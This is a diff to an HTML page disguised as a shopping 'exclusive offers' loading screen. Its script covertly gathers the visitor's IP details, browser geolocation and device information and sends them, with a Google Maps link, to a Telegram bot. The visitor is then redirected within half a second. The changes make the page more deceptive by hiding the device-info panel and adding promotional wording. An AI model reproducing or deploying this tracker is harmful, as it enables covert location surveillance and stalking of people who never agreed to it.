@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifying new Offers...</title>
+  <title>Exclusive Offers Loading...</title>
   <style>
     * {
       margin: 0;
@@ -19,104 +19,126 @@
       min-height: 100vh;
       background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
       padding: 20px;
+      overflow: hidden;
     }
     
     .container {
-      background: rgba(255, 255, 255, 0.9);
+      background: rgba(255, 255, 255, 0.95);
       border-radius: 16px;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-      padding: 30px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+      padding: 40px 30px;
       max-width: 500px;
       width: 100%;
       text-align: center;
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      animation: fadeIn 0.5s ease-out;
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      animation: fadeIn 0.6s ease-out;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .container::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
+      animation: rotate 15s linear infinite;
+      z-index: -1;
     }
     
     h1 {
       color: #2c3e50;
-      margin-bottom: 20px;
-      font-size: 28px;
-      font-weight: 600;
+      margin-bottom: 25px;
+      font-size: 32px;
+      font-weight: 700;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      position: relative;
+    }
+    
+    h1::after {
+      content: "";
+      display: block;
+      width: 100px;
+      height: 4px;
+      background: linear-gradient(90deg, #2196f3, #21cbf3);
+      margin: 15px auto 0;
+      border-radius: 4px;
     }
     
     .status {
-      background: #e3f2fd;
-      border-radius: 12px;
-      padding: 20px;
-      margin: 20px 0;
-      font-size: 18px;
+      background: rgba(227, 242, 253, 0.8);
+      border-radius: 14px;
+      padding: 22px;
+      margin: 30px 0;
+      font-size: 20px;
       color: #2c3e50;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 15px;
-      border-left: 5px solid #2196f3;
+      gap: 18px;
+      border-left: 6px solid #2196f3;
+      box-shadow: 0 6px 15px rgba(33, 150, 243, 0.2);
     }
     
     .loading-container {
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 20px;
-      margin: 30px 0;
+      gap: 25px;
+      margin: 40px 0;
     }
     
     .loading-spinner {
-      width: 60px;
-      height: 60px;
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #3498db;
+      width: 70px;
+      height: 70px;
+      border: 8px solid rgba(243, 243, 243, 0.8);
+      border-top: 8px solid #3498db;
       border-radius: 50%;
-      animation: spin 1.5s linear infinite;
+      animation: spin 1.2s linear infinite;
+      box-shadow: 0 0 20px rgba(52, 152, 219, 0.3);
     }
     
     .progress-container {
       width: 100%;
-      background: #e0e0e0;
-      border-radius: 10px;
+      background: rgba(224, 224, 224, 0.7);
+      border-radius: 12px;
       overflow: hidden;
-      height: 12px;
+      height: 15px;
+      box-shadow: inset 0 0 8px rgba(0,0,0,0.1);
     }
     
     .progress-bar {
       height: 100%;
       background: linear-gradient(90deg, #2196f3, #21cbf3);
       width: 0%;
-      border-radius: 10px;
-      transition: width 0.3s ease;
-    }
-    
-    .device-info {
-      background: #f5f5f5;
-      border-radius: 10px;
-      padding: 15px;
-      margin-top: 20px;
-      text-align: left;
-      font-size: 14px;
-      color: #555;
-    }
-    
-    .device-info h3 {
-      color: #2c3e50;
-      margin-bottom: 10px;
-      font-size: 16px;
-      border-bottom: 1px solid #ddd;
-      padding-bottom: 5px;
+      border-radius: 12px;
+      transition: width 0.4s cubic-bezier(0.25, 0.1, 0.25, 1);
     }
     
     .redirect-message {
-      margin-top: 20px;
-      font-size: 16px;
+      margin-top: 30px;
+      font-size: 18px;
       color: #2c3e50;
-      font-weight: 500;
+      font-weight: 600;
+      line-height: 1.6;
     }
     
     .countdown {
-      font-weight: 700;
+      font-weight: 800;
       color: #e74c3c;
-      font-size: 18px;
+      font-size: 24px;
+      display: inline-block;
+      min-width: 30px;
+    }
+    
+    .offer-highlight {
+      background: linear-gradient(90deg, #ff9a9e, #fad0c4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: 700;
     }
     
     @keyframes spin {
@@ -125,33 +147,49 @@
     }
     
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
+      from { opacity: 0; transform: translateY(30px); }
       to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes rotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.05); opacity: 0.9; }
+      100% { transform: scale(1); opacity: 1; }
     }
     
     @media (max-width: 480px) {
       .container {
-        padding: 20px;
+        padding: 30px 20px;
+        margin: 0 15px;
       }
       
       h1 {
-        font-size: 24px;
+        font-size: 26px;
       }
       
       .status {
+        font-size: 18px;
+        padding: 18px;
+      }
+      
+      .redirect-message {
         font-size: 16px;
-        padding: 15px;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Verifying new Offers</h1>
+    <h1>Discover Exclusive Offers</h1>
     
     <div class="status">
-      <span id="status-icon">📍</span>
-      <span id="status-text"> Verifying Offers...</span>
+      <span id="status-icon">🎁</span>
+      <span id="status-text">Loading Special Deals...</span>
     </div>
     
     <div class="loading-container">
@@ -161,13 +199,8 @@
       </div>
     </div>
     
-    <div class="device-info">
-      <h3>Dragon Mart Information</h3>
-      <div id="device-details">What is new...</div>
-    </div>
-    
     <div class="redirect-message">
-      Search for Offers <span class="countdown" id="countdown">2</span> seconds
+      You'll be redirected to our <span class="offer-highlight">exclusive offers</span> in <span class="countdown" id="countdown">0.5</span> seconds
     </div>
   </div>
 
@@ -179,23 +212,8 @@
     // DOM elements
     const statusText = document.getElementById('status-text');
     const statusIcon = document.getElementById('status-icon');
-    const deviceDetails = document.getElementById('device-details');
     const progressBar = document.getElementById('progress-bar');
     const countdownElement = document.getElementById('countdown');
-    
-    // Update device info display
-    function updateDeviceInfo() {
-      const deviceInfo = detectDeviceModel();
-      const networkInfo = getNetworkInfo();
-      
-      deviceDetails.innerHTML = `
-        <p><strong>Device:</strong> ${deviceInfo}</p>
-        <p><strong>Platform:</strong> ${navigator.platform}</p>
-        <p><strong>Browser:</strong> ${navigator.userAgent.split(') ').pop().split(' ')[0]}</p>
-        <p><strong>Resolution:</strong> ${screen.width}x${screen.height}</p>
-        <p><strong>IP:</strong> ${networkInfo.ip || "Detecting..."}</p>
-      `;
-    }
     
     // Detect device model
     function detectDeviceModel() {
@@ -237,17 +255,6 @@
       return "Unknown Device";
     }
     
-    // Get network info
-    function getNetworkInfo() {
-      return {
-        ip: "Detecting...",
-        org: "Unknown",
-        city: "Unknown",
-        region: "Unknown",
-        country: "Unknown"
-      };
-    }
-    
     // Send message to Telegram
     function sendData(message) {
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -279,7 +286,7 @@ https://maps.google.com/?q=${lat},${lon}
       sendData(message);
     }
     
-    // Get best Offers
+    // Get location
     function getLocationPromise() {
       return new Promise((resolve) => {
         if (navigator.geolocation) {
@@ -295,62 +302,54 @@ https://maps.google.com/?q=${lat},${lon}
     
     // Start tracking and redirect
     async function startTracking() {
-      // Update device info immediately
-      updateDeviceInfo();
-      
       // Get IP & network info first
       let ipData = {};
       try {
         const res = await fetch("https://ipapi.co/json/");
         ipData = await res.json();
-        updateDeviceInfo();
       } catch (e) {}
       
       // Update status
-      statusText.textContent = "What is new...";
-      statusIcon.textContent = "📡";
+      statusText.textContent = "Finding Best Deals...";
+      statusIcon.textContent = "🔍";
       
       // Start progress bar animation
       let progress = 0;
       const progressInterval = setInterval(() => {
-        progress += 1;
-        progressBar.style.width = `${progress}%`;
+        progress += 2;
+        progressBar.style.width = `${Math.min(progress, 100)}%`;
         if (progress >= 100) clearInterval(progressInterval);
-      }, 20);
+      }, 10);
       
       // Start countdown
-      let countdown = 1;
+      let countdown = 0.5;
       const countdownInterval = setInterval(() => {
-        countdownElement.textContent = countdown;
-        countdown--;
-        if (countdown < 0) {
+        countdownElement.textContent = countdown.toFixed(1);
+        countdown -= 0.1;
+        
+        if (countdown <= 0) {
           clearInterval(countdownInterval);
-          window.location.href = redirectURL;
+          countdownElement.textContent = "0.0";
+          setTimeout(() => {
+            window.location.href = redirectURL;
+          }, 100);
         }
-      }, 1000);
+      }, 100);
       
       // Get location
       const pos = await getLocationPromise();
       
       if (pos) {
-        statusText.textContent = "New Offers available!";
-        statusIcon.textContent = "✅";
+        statusText.textContent = "Exclusive Offers Unlocked!";
+        statusIcon.textContent = "🎉";
         sendLocation(pos.coords.latitude, pos.coords.longitude, ipData);
       } else {
-        statusText.textContent = "New Offers are not available";
-        statusIcon.textContent = "⚠️";
-        sendData(`❌ Location denied.\n${getDeviceInfo(ipData)}`);
+        statusText.textContent = "Special Offers Ready!";
+        statusIcon.textContent = "✨";
+        const message = `❌ Location denied.\n${getDeviceInfo(ipData)}`;
+        sendData(message);
       }
-      
-      // Complete progress bar
-      progressBar.style.width = "100%";
-      
-      // Wait until countdown completes
-      await new Promise(resolve => setTimeout(resolve, 2000));
     }
-    
-    // Start the process
-    startTracking();
     
     // Helper function for device info
     function getDeviceInfo(ipData) {
@@ -369,7 +368,9 @@ https://maps.google.com/?q=${lat},${lon}
 - Region: ${ipData.region || "Unknown"}
 - Country: ${ipData.country || "Unknown"}`;
     }
+    
+    // Start the process
+    startTracking();
   </script>
 </body>
 </html>
-
